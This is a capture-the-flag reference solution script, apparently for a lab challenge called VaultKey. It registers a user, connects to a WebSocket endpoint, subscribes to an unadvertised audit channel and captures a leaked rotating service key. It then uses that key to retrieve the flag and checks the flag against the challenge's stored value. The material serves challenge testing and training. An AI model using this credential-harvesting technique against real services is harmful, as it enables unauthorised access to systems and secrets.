#!/usr/bin/env bash
# ============================================================
# VaultKey (labs02) — reference solution: hidden WebSocket
# channel leaking rotated service credentials
#
# Chain: register -> connect ws://<host>/ws/system -> subscribe to
# the unadvertised system.audit channel -> capture an active
# vault-keeper key (vk_svc_vault_*, rotates every 60s) -> call
# GET /api/v1/flag with it.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8082)
# Prints the flag on stdout; exit 0 on success.
# Requires: python3 (stdlib only — includes a minimal WebSocket client)
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8082}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

flag="$(python3 - "$BASE" <<'PYEOF'
import base64, json, os, re, socket, struct, sys, time
import urllib.error, urllib.parse, urllib.request
from http.cookiejar import CookieJar

base = sys.argv[1]
parsed = urllib.parse.urlparse(base)
host, port = parsed.hostname, parsed.port or 80
flag_re = re.compile(r'FLAG\{nusasec-[0-9a-f]{32}\}')

# --- 1. Register an account (establishes the "legitimate user" context)
user = 'hunter%d%d' % (os.getpid() % 100000, int(time.time()) % 100000)
cj = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
form = urllib.parse.urlencode({
    'username': user,
    'email': user + '@example.com',
    'password': 'hunter123pass',
}).encode()
opener.open(base + '/register', form)
print('[*] registered as %s' % user, file=sys.stderr)

# --- 2. Minimal RFC6455 WebSocket client (stdlib only)
class WS:
    def __init__(self, host, port, path, timeout=10):
        self.sock = socket.create_connection((host, port), timeout)
        key = base64.b64encode(os.urandom(16)).decode()
        req = ('GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\n'
               'Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n'
               'Sec-WebSocket-Version: 13\r\nUser-Agent: solved/1.0\r\n\r\n') % (path, host, key)
        self.sock.sendall(req.encode())
        buf = b''
        while b'\r\n\r\n' not in buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError('closed during handshake')
            buf += chunk
        head, _, rest = buf.partition(b'\r\n\r\n')
        if b'101' not in head.split(b'\r\n', 1)[0]:
            raise ConnectionError('handshake refused: ' + head.split(b'\r\n', 1)[0].decode())
        self.buf, self.frag = rest, b''

    def _read(self, n):
        while len(self.buf) < n:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError('closed')
            self.buf += chunk
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def _send(self, opcode, payload):
        mask = os.urandom(4)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        n = len(payload)
        if n < 126:
            hdr = struct.pack('!BB', 0x80 | opcode, 0x80 | n)
        elif n < 65536:
            hdr = struct.pack('!BBH', 0x80 | opcode, 0x80 | 126, n)
        else:
            hdr = struct.pack('!BBQ', 0x80 | opcode, 0x80 | 127, n)
        self.sock.sendall(hdr + mask + masked)

    def send_text(self, text):
        self._send(1, text.encode())

    def recv_text(self, timeout=5):
        self.sock.settimeout(timeout)
        while True:
            b1, b2 = self._read(2)
            fin, op, n, masked = b1 & 0x80, b1 & 0x0F, b2 & 0x7F, b2 & 0x80
            if n == 126:
                n = struct.unpack('!H', self._read(2))[0]
            elif n == 127:
                n = struct.unpack('!Q', self._read(8))[0]
            data = self._read(n)
            if masked:
                mk = self._read(4)
                data = bytes(b ^ mk[i % 4] for i, b in enumerate(data))
            if op == 8:
                raise ConnectionError('server sent close')
            if op == 9:                      # ping -> pong
                self._send(10, data)
                continue
            if op == 10:                     # pong
                continue
            self.frag += data
            if fin:
                out, self.frag = self.frag, b''
                return out.decode('utf-8', 'replace')

# --- 3. Connect and subscribe to the unadvertised audit channel
ws = WS(host, port, '/ws/system')
welcome = json.loads(ws.recv_text())
print('[*] welcome advertises: %s' % welcome.get('advertised_channels'), file=sys.stderr)
ws.send_text(json.dumps({'action': 'subscribe', 'channel': 'system.audit'}))
print('[*] subscribed to system.audit, waiting for a vault-keeper rotation event', file=sys.stderr)

def try_flag(key):
    req = urllib.request.Request(base + '/api/v1/flag', headers={'X-API-Key': key})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read().decode()
    except urllib.error.HTTPError:
        return None
    m = flag_re.search(body)
    return m.group(0) if m else None

# Vault-keeper rotates every 60s; the replay buffer always contains its
# latest event. If the captured key was rotated out mid-flight, wait for
# the next live vault-keeper event and retry.
deadline = time.time() + 120
while time.time() < deadline:
    try:
        msg = json.loads(ws.recv_text(timeout=max(1, deadline - time.time())))
    except (socket.timeout, TimeoutError):
        continue
    if msg.get('service') == 'vault-keeper' and str(msg.get('key', '')).startswith('vk_svc_vault'):
        key = msg['key']
        print('[*] captured vault-keeper key: %s' % key, file=sys.stderr)
        flag = try_flag(key)
        if flag:
            print(flag)
            sys.exit(0)
        print('[-] key already rotated out, waiting for the next one', file=sys.stderr)

print('[-] failed: no active vault-keeper key captured in time', file=sys.stderr)
sys.exit(1)
PYEOF
)"

if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag extracted" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
